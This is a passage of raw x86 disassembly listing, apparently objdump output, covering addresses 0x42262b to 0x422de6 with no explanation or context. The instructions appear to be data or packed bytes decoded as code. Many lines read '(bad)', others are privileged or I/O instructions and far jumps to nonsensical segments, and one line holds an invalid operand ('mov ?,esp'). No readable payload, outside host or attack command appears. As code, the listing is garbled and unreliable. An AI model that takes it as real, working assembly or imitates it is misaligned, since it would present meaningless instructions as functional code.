  42262b:	fisttp QWORD PTR [eax-0x9]
  42262e:	sbb    BYTE PTR [ebx-0x3cf571b4],bh
  422634:	xor    DWORD PTR [ecx+0x4fe807a9],esi
  42263a:	mov    BYTE PTR [ecx+edx*1+0x46],bh
  42263e:	xor    DWORD PTR [edi-0x5d4002e5],ecx
  422644:	mov    esp,0x4a4c1fd7
  422649:	jl     0x4225d0
  42264b:	jmp    0x8f87:0x90ae73e3
  422652:	dec    eax
  422653:	add    eax,0x9c29dfac
  422658:	cmp    al,0x40
  42265a:	test   eax,0x203c5958
  42265f:	repz sbb BYTE PTR [esi],0xd7
  422663:	sbb    eax,0x4110db3f
  422668:	jb     0x422659
  42266a:	jb     0x422655
  42266c:	scas   al,BYTE PTR es:[edi]
  42266d:	cdq    
  42266e:	aam    0xcf
  422670:	xor    DWORD PTR [ecx-0xb],0x1b
  422674:	mov    cl,0x8d
  422676:	mov    ch,0x1a
  422678:	mov    WORD PTR [eax-0x7958a3b2],ss
  42267e:	mov    BYTE PTR [eax+edx*8-0x5b],ah
  422682:	jl     0x42260d
  422684:	xor    BYTE PTR [edi],bl
  422686:	cmp    DWORD PTR [edx],ebx
  422688:	pop    esi
  422689:	push   edi
  42268a:	rol    DWORD PTR [eax+0x26],1
  42268d:	cwde   
  42268e:	fstp   TBYTE PTR [ebp+0x36]
  422691:	mov    bx,0xb492
  422695:	scas   eax,DWORD PTR es:[edi]
  422696:	test   al,0x59
  422698:	test   DWORD PTR ds:0xc274469f,ebx
  42269e:	xlat   BYTE PTR ds:[ebx]
  42269f:	cmp    eax,0x6071f139
  4226a4:	sahf   
  4226a5:	sub    eax,0x265917a1
  4226aa:	lock imul esp,DWORD PTR gs:[esi+0x721f1d8e],0x3719a9b5
  4226b6:	inc    esi
  4226b7:	mov    ebp,DWORD PTR [ecx-0x1e]
  4226ba:	jb     0x4226a7
  4226bc:	mov    edi,0xf44c8fe9
  4226c1:	les    esi,FWORD PTR [esi+0x4a4d6bb1]
  4226c7:	fwait
  4226c8:	clc    
  4226c9:	sbb    eax,0x1fcb94f7
  4226ce:	sbb    BYTE PTR ds:0xadd60275,al
  4226d4:	or     esp,DWORD PTR [edx+0xe92510e]
  4226da:	aas    
  4226db:	je     0x422684
  4226dd:	icebp  
  4226de:	scas   al,BYTE PTR es:[edi]
  4226df:	fadd   QWORD PTR [edi+0x612f02f8]
  4226e6:	mov    ds:0x570b03d5,al
  4226eb:	mov    edi,0x344fe7f8
  4226f0:	nop
  4226f1:	and    al,0x7d
  4226f3:	popa   
  4226f4:	ins    BYTE PTR es:[edi],dx
  4226f5:	mov    ebx,0x6f494a7d
  4226fa:	sbb    ebp,ecx
  4226fc:	in     eax,dx
  4226fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226fe:	mov    ebp,0x22d3b80b
  422703:	pop    ebx
  422704:	mov    ebx,0xa854848f
  422709:	jnp    0x4226f7
  42270b:	test   DWORD PTR [ecx-0x5bf0d4dd],0x82e29395
  422715:	jno    0x422754
  422717:	xchg   edi,eax
  422718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422719:	fst    QWORD PTR [ebx]
  42271b:	cmp    esp,edx
  42271d:	dec    ecx
  42271e:	test   BYTE PTR [eax],al
  422720:	pushf  
  422721:	popa   
  422722:	dec    ebp
  422723:	js     0x4227a2
  422725:	inc    ebp
  422726:	cmp    edx,DWORD PTR [esi-0x71]
  422729:	sbb    DWORD PTR [ebp-0x69239845],eax
  42272f:	stos   BYTE PTR es:[edi],al
  422730:	fild   QWORD PTR [edi+0x73efd808]
  422736:	and    DWORD PTR [edx+0x28],edx
  422739:	xchg   ebx,eax
  42273a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42273b:	mov    bh,0x6b
  42273d:	loope  0x422717
  42273f:	fistp  DWORD PTR [esi+0x6417e47]
  422745:	push   ecx
  422746:	in     al,0x8e
  422748:	es xchg ecx,eax
  42274a:	cmp    bh,BYTE PTR [edx+eiz*2-0x22d14557]
  422751:	xor    BYTE PTR [edx-0x33],0x90
  422755:	push   edx
  422756:	ss je  0x4226ec
  422759:	xchg   esi,eax
  42275a:	dec    eax
  42275b:	out    dx,eax
  42275c:	jg     0x422710
  42275e:	xchg   DWORD PTR [edi+0x48],ecx
  422761:	popa   
  422762:	mov    dl,0x79
  422764:	test   al,0xea
  422766:	inc    edi
  422767:	inc    eax
  422768:	scas   eax,DWORD PTR es:[edi]
  422769:	popf   
  42276a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42276b:	dec    ecx
  42276c:	and    edi,edx
  42276e:	int    0x76
  422770:	cld    
  422771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422772:	adc    dh,BYTE PTR [eax]
  422774:	mov    es,WORD PTR [ecx]
  422776:	aam    0xa1
  422778:	ds cs mov ebp,0x22400f3e
  42277f:	imul   edi,DWORD PTR [ecx-0x7ef1714d],0xff35d7f
  422789:	aaa    
  42278a:	jne    0x422741
  42278c:	mov    ?,esp
  42278e:	and    dh,BYTE PTR [esi+0x33b86f63]
  422794:	add    esp,DWORD PTR [eax]
  422796:	push   esp
  422797:	out    dx,eax
  422798:	fmul   DWORD PTR [esi-0x54abc7e0]
  42279e:	jg     0x422756
  4227a0:	cmp    BYTE PTR [edi+0x2a],cl
  4227a3:	or     BYTE PTR [ebp-0x186d983f],cl
  4227a9:	call   0xc9721c29
  4227ae:	mov    ch,0x52
  4227b0:	cwde   
  4227b1:	push   ds
  4227b2:	pop    ss
  4227b3:	fidiv  DWORD PTR [edi-0x2b]
  4227b6:	inc    BYTE PTR [edi-0x48]
  4227b9:	fistp  QWORD PTR [esi]
  4227bb:	mov    ds:0x684c54ed,al
  4227c0:	pop    es
  4227c1:	pop    eax
  4227c2:	in     al,0xd0
  4227c4:	jle    0x422819
  4227c6:	jbe    0x422847
  4227c8:	(bad)  
  4227c9:	sub    esp,DWORD PTR [esi+0x7ec75203]
  4227cf:	xchg   esi,eax
  4227d0:	imul   esi,esi,0x5a
  4227d3:	ss pop ebp
  4227d5:	mov    bh,0x9e
  4227d7:	not    ah
  4227d9:	sbb    DWORD PTR [edx+0x1b2a8855],esp
  4227df:	or     bh,0x55
  4227e2:	push   esi
  4227e3:	or     bl,BYTE PTR [edi]
  4227e5:	push   esp
  4227e6:	scas   eax,DWORD PTR es:[edi]
  4227e7:	paddd  mm2,QWORD PTR [ebp+0x1c]
  4227eb:	mov    ah,0x51
  4227ed:	cmp    eax,0x66e1dec1
  4227f2:	jnp    0x422870
  4227f4:	dec    BYTE PTR [esi-0x71]
  4227f7:	mov    DWORD PTR [ecx+ebp*4+0x8],edi
  4227fb:	sysret 
  4227fd:	sbb    dh,BYTE PTR [edx-0x9ff3f21]
  422803:	pop    ecx
  422804:	fwait
  422805:	sbb    bl,BYTE PTR gs:[esi-0x171b4762]
  42280c:	push   0x55
  42280e:	pop    edx
  42280f:	es loop 0x42281d
  422812:	fdivr  QWORD PTR [ebx]
  422814:	icebp  
  422815:	jne    0x422860
  422817:	test   al,0xcc
  422819:	outs   dx,BYTE PTR ds:[esi]
  42281a:	xchg   ebx,eax
  42281b:	lahf   
  42281c:	xlat   BYTE PTR ds:[ebx]
  42281d:	cmp    BYTE PTR [ebp-0x4c],bh
  422820:	cdq    
  422821:	imul   edx,DWORD PTR [eax+0x43931c3e],0xffffffe6
  422828:	inc    esi
  422829:	daa    
  42282a:	xor    DWORD PTR [eax+0x14f74aa4],edx
  422830:	pusha  
  422831:	push   edi
  422832:	ss mov cl,0x6e
  422835:	or     edi,DWORD PTR [ecx]
  422837:	imul   ebp,DWORD PTR [ecx-0xabed81d],0xffffff87
  42283e:	push   es
  42283f:	(bad)  
  422840:	out    dx,al
  422841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422842:	(bad)  
  422843:	icebp  
  422844:	fwait
  422845:	cdq    
  422846:	add    esp,0xd05672bf
  42284c:	int    0xb2
  42284e:	repnz sub dh,BYTE PTR [ebp+edi*4+0x37]
  422853:	mov    WORD PTR [edx+0x13eba7e2],ss
  422859:	sub    edi,DWORD PTR [eax+0x21f9adf1]
  42285f:	clc    
  422860:	(bad)  
  422861:	retf   
  422862:	sbb    eax,0xc0ae2db6
  422867:	lea    edx,[eax]
  422869:	adc    bl,BYTE PTR [edi-0x39ff50fc]
  42286f:	sbb    DWORD PTR [edi],ebx
  422871:	sbb    eax,0x7220e589
  422876:	fisubr DWORD PTR [eax+0x4e8895bb]
  42287c:	fnstcw WORD PTR [edi-0x54791c4d]
  422882:	adc    al,0xc3
  422884:	adc    eax,0x290f5088
  422889:	loop   0x42283a
  42288b:	adc    DWORD PTR [esi+0x3e501516],ebp
  422891:	hlt    
  422892:	and    ah,BYTE PTR es:[edi+0x7470486b]
  422899:	ss xor al,0x89
  42289c:	ins    BYTE PTR es:[edi],dx
  42289d:	aaa    
  42289e:	push   ds
  42289f:	cmp    al,0x69
  4228a1:	in     eax,dx
  4228a2:	sub    edx,esi
  4228a4:	aad    0x94
  4228a6:	mov    dl,0x7d
  4228a8:	call   0x9d87:0x8f99cc1d
  4228af:	ja     0x42283a
  4228b1:	or     eax,0x8dd81e34
  4228b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228b7:	ret    0xc063
  4228ba:	dec    ebx
  4228bb:	aas    
  4228bc:	jmp    FWORD PTR [edx-0x3]
  4228bf:	jmp    0xeb64:0x6d32a528
  4228c6:	rcl    bl,cl
  4228c8:	pop    ecx
  4228c9:	jp     0x422900
  4228cb:	fisttp WORD PTR [ebx+0x60]
  4228ce:	clc    
  4228cf:	sbb    edx,DWORD PTR [esi+0x5e]
  4228d2:	xchg   ebp,eax
  4228d3:	mov    gs,WORD PTR [eax-0x79f2bcf3]
  4228d9:	sahf   
  4228da:	lahf   
  4228db:	inc    esp
  4228dc:	scas   al,BYTE PTR es:[edi]
  4228dd:	jg     0x4228b9
  4228df:	jp     0x422947
  4228e1:	retf   
  4228e2:	push   es
  4228e3:	sub    esi,DWORD PTR [edi]
  4228e5:	test   DWORD PTR [edx+0x73],esi
  4228e8:	dec    eax
  4228e9:	dec    esi
  4228ea:	fnstcw WORD PTR [edx+0x12611ff0]
  4228f0:	mov    ebp,0x38dcf021
  4228f5:	popa   
  4228f6:	rcr    DWORD PTR [ebp-0x745ec87],cl
  4228fc:	sbb    al,0xd
  4228fe:	in     al,dx
  4228ff:	push   esp
  422900:	cmp    bl,BYTE PTR [ecx-0x5d]
  422903:	mov    ds:0x5fa1200e,al
  422908:	ja     0x4228c1
  42290a:	jb     0x42289d
  42290c:	fwait
  42290d:	adc    esp,ebp
  42290f:	icebp  
  422910:	inc    esi
  422911:	jne    0x4228ad
  422913:	fmul   QWORD PTR [edx]
  422915:	hlt    
  422916:	shl    DWORD PTR [edx-0x7c],1
  422919:	int    0x56
  42291b:	or     al,0x48
  42291d:	push   ds
  42291e:	test   DWORD PTR [esi],0xaa950ae9
  422924:	(bad)  
  422925:	adc    ecx,DWORD PTR [ecx+esi*4]
  422928:	xchg   BYTE PTR [eax+esi*4+0xceec792],cl
  42292f:	shl    cl,1
  422931:	mov    bl,0xb1
  422933:	scas   eax,DWORD PTR es:[edi]
  422934:	sub    cl,BYTE PTR [edx-0x8]
  422937:	dec    esp
  422938:	sub    BYTE PTR [ecx+0xb],0x51
  42293c:	arpl   WORD PTR [edi-0x32],ax
  42293f:	mov    al,0x33
  422941:	aas    
  422942:	mov    ebx,0x7ee61ee4
  422947:	xor    ecx,DWORD PTR [eax]
  422949:	call   0x5d3a760a
  42294e:	(bad)  
  42294f:	mov    esi,0x74e6d5a
  422954:	ins    BYTE PTR es:[edi],dx
  422955:	xchg   esi,eax
  422956:	fwait
  422957:	das    
  422958:	mov    ds:0xfd2aaac7,eax
  42295d:	clc    
  42295e:	pop    ss
  42295f:	je     0x4228fd
  422961:	imul   esp,DWORD PTR [edi+ecx*1+0x3898f557],0xd94f3a2b
  42296c:	pop    edx
  42296d:	fdiv   QWORD PTR [eax+0x5e]
  422970:	ss fwait
  422972:	mov    WORD PTR [ebx+0x1b],ss
  422975:	sub    eax,0xc0981186
  42297a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42297b:	mov    esp,DWORD PTR [esi]
  42297d:	outs   dx,DWORD PTR ds:[esi]
  42297e:	xor    dl,al
  422980:	adc    eax,0x2857f39f
  422985:	ss jmp 0x3e5d:0x3e19d477
  42298d:	pop    eax
  42298e:	and    al,0xd2
  422990:	push   edi
  422991:	mov    al,ds:0xb6b001a7
  422996:	sub    ebp,edi
  422998:	sahf   
  422999:	inc    eax
  42299a:	lods   eax,DWORD PTR ds:[esi]
  42299b:	fwait
  42299c:	aam    0x4
  42299e:	lods   eax,DWORD PTR ds:[esi]
  42299f:	mov    dl,0x8e
  4229a1:	jns    0x4229b9
  4229a3:	(bad)  
  4229a4:	aaa    
  4229a5:	mov    cs,WORD PTR [ecx-0x1a3069d0]
  4229ab:	test   al,0x29
  4229ad:	sbb    dh,dl
  4229af:	mov    al,ds:0x7d000946
  4229b4:	push   esp
  4229b5:	int3   
  4229b6:	je     0x4229e5
  4229b8:	cmp    ah,dl
  4229ba:	int    0xac
  4229bc:	mov    BYTE PTR [eax],0xab
  4229bf:	lods   al,BYTE PTR ds:[esi]
  4229c0:	ins    DWORD PTR es:[edi],dx
  4229c1:	repnz and eax,0xeffb28f9
  4229c7:	(bad)  
  4229c8:	cmp    BYTE PTR [edx+edi*8+0x6630dec5],ch
  4229cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229d0:	add    BYTE PTR [ecx-0x4f3b4c58],bl
  4229d6:	rol    DWORD PTR ds:0x47e43e2a,1
  4229dc:	and    cl,BYTE PTR [esi+0x55]
  4229df:	add    edx,0x8b667332
  4229e5:	pop    ss
  4229e6:	mov    DWORD PTR [esi+0x76],0xe82c9822
  4229ed:	mov    bh,0xec
  4229ef:	mov    DWORD PTR [edi],ecx
  4229f1:	jo     0x4229d8
  4229f3:	jno    0x4229b2
  4229f5:	mov    ah,0x3c
  4229f7:	jbe    0x4229a0
  4229f9:	cli    
  4229fa:	loop   0x4229cc
  4229fc:	int3   
  4229fd:	icebp  
  4229fe:	cdq    
  4229ff:	js     0x422a58
  422a01:	adc    al,0xda
  422a03:	mov    ch,0x7c
  422a05:	test   eax,0x8aef2bc4
  422a0a:	clc    
  422a0b:	pop    edx
  422a0c:	or     BYTE PTR [ebx-0x6e03a65d],ah
  422a12:	clc    
  422a13:	inc    ecx
  422a14:	mov    esi,0x7541d362
  422a19:	pop    edx
  422a1a:	div    BYTE PTR [ebp-0x2fd437d0]
  422a20:	xchg   edx,eax
  422a21:	stos   DWORD PTR es:[edi],eax
  422a22:	inc    edx
  422a23:	inc    eax
  422a24:	jp     0x422a39
  422a26:	mov    es:0xa7fda09b,eax
  422a2c:	push   esp
  422a2d:	(bad)  
  422a2e:	out    dx,al
  422a2f:	or     al,0xbf
  422a31:	xchg   cl,ch
  422a33:	imul   edi,eax,0x48
  422a36:	(bad)  
  422a37:	fnstenv [eax-0x1f4749f0]
  422a3d:	bound  ebx,QWORD PTR ds:0xfcd8d546
  422a43:	(bad)  
  422a44:	loopne 0x422a12
  422a46:	mov    dh,0x2b
  422a48:	mov    al,ds:0x8db43db3
  422a4d:	popf   
  422a4e:	call   FWORD PTR [ecx]
  422a50:	jp     0x4229e6
  422a52:	retf   0x12be
  422a55:	shl    ebx,cl
  422a57:	call   FWORD PTR ds:[ecx-0x6]
  422a5b:	retf   0x7e5f
  422a5e:	jle    0x4229f1
  422a60:	sbb    ebp,DWORD PTR ds:0xbab44a85
  422a66:	cmp    eax,0x62ec3e26
  422a6b:	sbb    edi,edi
  422a6d:	ins    BYTE PTR es:[edi],dx
  422a6e:	rol    esp,1
  422a70:	cmc    
  422a71:	jp     0x4229fd
  422a73:	mov    ebp,0x1837442
  422a78:	fwait
  422a79:	add    BYTE PTR [edx-0x18],ah
  422a7c:	in     al,0xb6
  422a7e:	rcr    DWORD PTR [ecx-0x1a],cl
  422a81:	mov    edi,0xd919076b
  422a86:	adc    al,0x8a
  422a88:	push   0xffffffef
  422a8a:	sub    BYTE PTR [edi-0x7e],dh
  422a8d:	in     eax,0x86
  422a8f:	and    DWORD PTR [edi],ebx
  422a91:	leave  
  422a92:	repz mov edi,0x5dc2458c
  422a98:	scas   al,BYTE PTR es:[edi]
  422a99:	outs   dx,BYTE PTR ds:[esi]
  422a9a:	jne    0x422a8d
  422a9c:	ror    BYTE PTR [edi+0x29],0x19
  422aa0:	inc    ebx
  422aa1:	out    dx,eax
  422aa2:	fldenv [eax]
  422aa4:	mov    eax,0xae4b769c
  422aa9:	push   ds
  422aaa:	adc    DWORD PTR [ebx+0x68c0c6c0],ebx
  422ab0:	push   ebp
  422ab1:	and    edx,edi
  422ab3:	popa   
  422ab4:	lods   eax,DWORD PTR ds:[esi]
  422ab5:	out    0xda,al
  422ab7:	loope  0x422a7f
  422ab9:	or     cl,cl
  422abb:	arpl   WORD PTR [ecx+eiz*2-0x3c596c73],sp
  422ac2:	fistp  DWORD PTR [ebx-0x36]
  422ac5:	imul   DWORD PTR [ebx-0x3d922be1]
  422acb:	sub    BYTE PTR [ebp-0x64],bl
  422ace:	jecxz  0x422af2
  422ad0:	aad    0xf6
  422ad2:	scas   eax,DWORD PTR es:[edi]
  422ad3:	lods   al,BYTE PTR ds:[esi]
  422ad4:	sar    DWORD PTR [edi-0x6b3012da],1
  422ada:	pop    eax
  422adb:	push   cs
  422adc:	jmp    0xf0ed:0x5cf5325e
  422ae3:	and    al,0xd7
  422ae5:	in     al,0xe2
  422ae7:	iret   
  422ae8:	mov    bl,BYTE PTR [esi+0x46]
  422aeb:	xchg   edx,eax
  422aec:	xchg   ebx,eax
  422aed:	jle    0x422b24
  422aef:	xchg   edi,eax
  422af0:	loop   0x422b1a
  422af2:	outs   dx,DWORD PTR ds:[esi]
  422af3:	aad    0x2e
  422af5:	sub    ah,bh
  422af7:	(bad)  
  422af8:	ja     0x422af6
  422afa:	dec    ebx
  422afb:	push   0x70d9696f
  422b00:	js     0xdc17d451
  422b06:	fstp   TBYTE PTR [ebx+0x13fc8080]
  422b0c:	stos   DWORD PTR es:[edi],eax
  422b0d:	xchg   ebp,eax
  422b0e:	cli    
  422b0f:	in     al,dx
  422b10:	ret    0xb8a9
  422b13:	mov    ch,0xe
  422b15:	mov    al,0xfe
  422b17:	jno    0x422b0a
  422b19:	retf   0x5354
  422b1c:	cli    
  422b1d:	mov    DWORD PTR [esi],0x98358ceb
  422b23:	add    eax,DWORD PTR [edx]
  422b25:	xchg   ecx,eax
  422b26:	or     al,0x51
  422b28:	int3   
  422b29:	loop   0x422ab7
  422b2b:	stos   BYTE PTR es:[edi],al
  422b2c:	inc    edi
  422b2d:	jmp    0x6ff9:0x43f51409
  422b34:	fmul   QWORD PTR [ecx]
  422b36:	(bad)  
  422b37:	popa   
  422b38:	mov    ds,WORD PTR [edx-0xa]
  422b3b:	gs mov edx,edx
  422b3e:	jp     0x422aef
  422b40:	(bad)  
  422b41:	adc    eax,0xbdd29ff9
  422b46:	lods   al,BYTE PTR ds:[esi]
  422b47:	rcr    DWORD PTR [esi],1
  422b49:	shl    dh,0xdc
  422b4c:	bound  edi,QWORD PTR [eax-0x1db3a2ca]
  422b52:	jb     0x422b83
  422b54:	repz sub dh,BYTE PTR [edx]
  422b57:	xor    al,0x10
  422b59:	sub    cl,BYTE PTR [edx]
  422b5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b5c:	hlt    
  422b5d:	fld    st(6)
  422b5f:	int    0xe9
  422b61:	sahf   
  422b62:	push   0xc2aa493c
  422b67:	dec    ebx
  422b68:	inc    ebx
  422b69:	test   BYTE PTR [edx-0x1c4acfb1],ah
  422b6f:	sub    BYTE PTR [ebx+0x79],dl
  422b72:	sbb    BYTE PTR ds:0xf6bb8dea,bh
  422b78:	xchg   bl,dh
  422b7a:	jmp    0x7ec2:0x7b2a8045
  422b81:	inc    edx
  422b82:	fnstsw WORD PTR ds:0x5911a2ca
  422b88:	pop    ecx
  422b89:	outs   dx,DWORD PTR ds:[esi]
  422b8a:	dec    esp
  422b8b:	ins    DWORD PTR es:[edi],dx
  422b8c:	mov    ebx,0xe8578685
  422b91:	outs   dx,DWORD PTR ds:[esi]
  422b92:	pop    edx
  422b93:	imul   ebx,DWORD PTR [ebp-0x3cd93514],0x76
  422b9a:	stos   DWORD PTR es:[edi],eax
  422b9b:	mov    bl,0xae
  422b9d:	add    al,0xb
  422b9f:	cmp    DWORD PTR [eax],edx
  422ba1:	cld    
  422ba2:	mov    edi,0xa8060921
  422ba7:	jg     0x422b60
  422ba9:	fidivr WORD PTR [ebx]
  422bab:	and    eax,0x65dab214
  422bb0:	sub    al,0xc
  422bb2:	adc    al,0x2e
  422bb4:	add    edx,esi
  422bb6:	dec    ecx
  422bb7:	fiadd  WORD PTR [ebx+ebp*1+0x39]
  422bbb:	imul   BYTE PTR [edx]
  422bbd:	adc    BYTE PTR fs:[ecx+0x15b47cb6],al
  422bc4:	lds    edi,FWORD PTR [edi]
  422bc6:	pop    ds
  422bc7:	cmc    
  422bc8:	or     eax,0xdfcb06a9
  422bcd:	retf   0x77b0
  422bd0:	shr    BYTE PTR [eax+0x70b9fd16],1
  422bd6:	rcl    DWORD PTR [edx+0xb7720e5],1
  422bdc:	fldenv ds:0x3550c0e
  422be2:	daa    
  422be3:	jmp    0x69f8:0x920d9dd4
  422bea:	inc    eax
  422beb:	(bad)  [eax-0x719f77fb]
  422bf1:	mov    ebx,0xfa6b1245
  422bf6:	into   
  422bf7:	sahf   
  422bf8:	adc    DWORD PTR [edi+0x6b06b72c],ebp
  422bfe:	inc    esi
  422bff:	fist   DWORD PTR [eax+ebp*2-0x9]
  422c03:	xchg   edx,esp
  422c05:	dec    esi
  422c06:	repnz lods eax,DWORD PTR ds:[esi]
  422c08:	jb     0x422b94
  422c0a:	(bad)  
  422c0b:	(bad)  
  422c0c:	test   al,0x29
  422c0e:	xchg   ebx,eax
  422c0f:	mov    cl,0x64
  422c11:	js     0x422c18
  422c13:	mov    al,ds:0x2220f1bf
  422c18:	shr    DWORD PTR [edi],cl
  422c1a:	push   0xffffff8c
  422c1c:	scas   eax,DWORD PTR es:[edi]
  422c1d:	sub    al,0xfe
  422c1f:	push   cs
  422c20:	and    DWORD PTR [ebp-0x52],eax
  422c23:	and    BYTE PTR [ebp+0x49],0x11
  422c27:	jnp    0x422c51
  422c29:	dec    ebp
  422c2a:	cmp    al,0x61
  422c2c:	mov    BYTE PTR [edx],0xaa
  422c2f:	push   ebp
  422c30:	mov    ebx,0x6edc9845
  422c35:	scas   eax,DWORD PTR es:[edi]
  422c36:	inc    esi
  422c37:	fdivr  DWORD PTR [ebx+0x7f]
  422c3a:	mov    ah,0xbf
  422c3c:	add    ecx,DWORD PTR [ecx-0x5]
  422c3f:	sub    al,0x1c
  422c41:	inc    esp
  422c42:	loope  0x422c77
  422c44:	add    al,0x8
  422c46:	xor    ecx,DWORD PTR [esi]
  422c48:	pushw  0x1
  422c4b:	cmp    BYTE PTR [ebp-0x3c],cl
  422c4e:	fwait
  422c4f:	bound  ecx,QWORD PTR [ebx-0x3462596d]
  422c55:	add    ah,BYTE PTR [ecx+0x3d7d261d]
  422c5b:	add    DWORD PTR [ebp-0x4a],0xffffff9c
  422c5f:	(bad)  
  422c60:	cld    
  422c61:	cmp    BYTE PTR [edi+0x36],ah
  422c64:	inc    edx
  422c65:	mul    bl
  422c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c68:	or     al,0x3a
  422c6a:	add    eax,0x2abad0e
  422c6f:	ss push esp
  422c71:	xor    eax,esi
  422c73:	lock push ebx
  422c75:	adc    edx,edi
  422c77:	jb     0x422c86
  422c79:	inc    esp
  422c7a:	jb     0x422ce7
  422c7c:	sub    eax,DWORD PTR [ebx-0x42]
  422c7f:	retf   
  422c80:	xchg   DWORD PTR [edi+0x365a8a02],ecx
  422c86:	jns    0x422ceb
  422c88:	or     dl,BYTE PTR [edi-0x22]
  422c8b:	mov    esp,esi
  422c8d:	pop    edi
  422c8e:	rcr    DWORD PTR [esi+0x350799e7],1
  422c94:	fcomp  QWORD PTR [eax+ecx*2-0x1aa409f8]
  422c9b:	push   ebx
  422c9c:	mov    ebp,0x8a2de882
  422ca1:	xor    ch,BYTE PTR [edx+0x5bdcf55c]
  422ca7:	dec    ecx
  422ca8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ca9:	inc    esp
  422caa:	pop    ecx
  422cab:	dec    eax
  422cac:	push   cs
  422cad:	mov    dh,0xef
  422caf:	mov    cl,0xc2
  422cb1:	in     eax,dx
  422cb2:	imul   esi,ebp,0xa3bbffa1
  422cb8:	fld    QWORD PTR [esi+esi*8]
  422cbb:	cmp    ch,BYTE PTR [ebp+0x608ef61d]
  422cc1:	xchg   ebx,edx
  422cc3:	sbb    eax,DWORD PTR [ebx+0x30]
  422cc6:	(bad)  
  422cc7:	dec    edx
  422cc8:	lock ret 0x6a
  422ccc:	cmp    al,0x2d
  422cce:	mov    fs,eax
  422cd0:	lods   eax,DWORD PTR ds:[esi]
  422cd1:	aad    0x8c
  422cd3:	fdiv   DWORD PTR [ebp+0x4a83a93a]
  422cd9:	and    al,0xd3
  422cdb:	xchg   edx,eax
  422cdc:	xor    edi,DWORD PTR [esi-0x76]
  422cdf:	inc    edx
  422ce0:	dec    esp
  422ce1:	add    al,BYTE PTR [ebp-0x59]
  422ce4:	and    eax,0xf605e408
  422ce9:	cmp    cl,BYTE PTR [esp+edi*4]
  422cec:	dec    edi
  422ced:	popa   
  422cee:	inc    ecx
  422cef:	mov    ss,WORD PTR [ebx-0x438f927d]
  422cf5:	rcl    DWORD PTR [ecx],cl
  422cf7:	sbb    BYTE PTR fs:[edi-0x28e2e5d5],0x94
  422cff:	mov    ebp,0xfba02acb
  422d04:	cdq    
  422d05:	or     DWORD PTR ds:0x43fe3a1e,0xf09d4463
  422d0f:	cmc    
  422d10:	aam    0x38
  422d12:	jo     0x422d48
  422d14:	lock adc ch,BYTE PTR [eax+0x3]
  422d18:	sub    edi,esp
  422d1a:	xchg   edi,eax
  422d1b:	pop    esi
  422d1c:	jbe    0x422d19
  422d1e:	stos   DWORD PTR es:[edi],eax
  422d1f:	div    BYTE PTR [ebx]
  422d21:	call   0xb5f74dfb
  422d26:	pop    eax
  422d27:	mov    BYTE PTR [esp+ecx*1],dh
  422d2a:	cmp    DWORD PTR [ebx],ebx
  422d2c:	xchg   esi,eax
  422d2d:	je     0x422cd8
  422d2f:	mov    ah,0x39
  422d31:	(bad)  
  422d32:	test   BYTE PTR [edx-0x59],ah
  422d35:	retf   
  422d36:	mov    ebp,0x2eafb912
  422d3b:	cdq    
  422d3c:	cdq    
  422d3d:	lea    ebp,[ecx+0xf26b60e]
  422d43:	mov    ch,0x1c
  422d45:	adc    DWORD PTR [ecx+0x1f],esp
  422d48:	sbb    BYTE PTR [ecx],0x2b
  422d4b:	or     al,0x9d
  422d4d:	jbe    0x422d61
  422d4f:	inc    ebx
  422d50:	mov    dh,0x34
  422d52:	mov    al,ds:0xe052125e
  422d57:	and    eax,DWORD PTR [edx+0x49290d3c]
  422d5d:	dec    esi
  422d5e:	inc    edi
  422d5f:	adc    edx,edx
  422d61:	adc    DWORD PTR [ebp+0xf],ecx
  422d64:	imul   esi,DWORD PTR [ecx+0x72],0xffffff9e
  422d68:	xor    al,0x7
  422d6a:	(bad)  
  422d6b:	jecxz  0x422d23
  422d6d:	pop    edi
  422d6e:	adc    eax,0x950135f8
  422d73:	sahf   
  422d74:	lahf   
  422d75:	cmp    DWORD PTR ds:0xf0009c1a,edi
  422d7b:	in     al,dx
  422d7c:	xchg   edi,eax
  422d7d:	popf   
  422d7e:	cwde   
  422d7f:	dec    edi
  422d80:	xchg   ebp,eax
  422d81:	dec    ebx
  422d82:	addr16 adc eax,0xa288c8a3
  422d88:	cli    
  422d89:	(bad)  
  422d8a:	jmp    0xc12b2fe9
  422d8f:	(bad)  
  422d90:	jnp    0x422dbc
  422d92:	ror    DWORD PTR [esi],cl
  422d94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d95:	jne    0x422d91
  422d97:	jae    0x422d66
  422d99:	dec    ecx
  422d9a:	sub    al,0x34
  422d9c:	jecxz  0x422d57
  422d9e:	adc    eax,DWORD PTR [ecx-0x68d74799]
  422da4:	popf   
  422da5:	daa    
  422da6:	fidiv  DWORD PTR [edi+0xf]
  422da9:	rol    edx,0x87
  422dac:	inc    esp
  422dad:	push   ss
  422dae:	add    al,BYTE PTR [ecx-0x5b]
  422db1:	pop    ecx
  422db2:	xchg   edi,eax
  422db3:	bound  edx,QWORD PTR [eax-0x2ab6f192]
  422db9:	dec    ebx
  422dba:	test   al,0x65
  422dbc:	pop    edi
  422dbd:	xchg   esp,eax
  422dbe:	stos   DWORD PTR es:[edi],eax
  422dbf:	mov    ds:0x96d9a83c,al
  422dc4:	mov    dl,0x2d
  422dc6:	and    al,0x5c
  422dc8:	push   es
  422dc9:	inc    ebp
  422dca:	sti    
  422dcb:	jecxz  0x422dca
  422dcd:	in     al,0xee
  422dcf:	mov    esi,0xc32dc9c8
  422dd4:	xchg   ebp,eax
  422dd5:	pop    ecx
  422dd6:	adc    al,0xe9
  422dd8:	loop   0x422e2d
  422dda:	loopne 0x422e06
  422ddc:	imul   esi,DWORD PTR [esi-0x14],0xffffffd6
  422de0:	sub    eax,0xa1f5d5c1
  422de5:	inc    ebx
  422de6:	cmp    al,0xa2
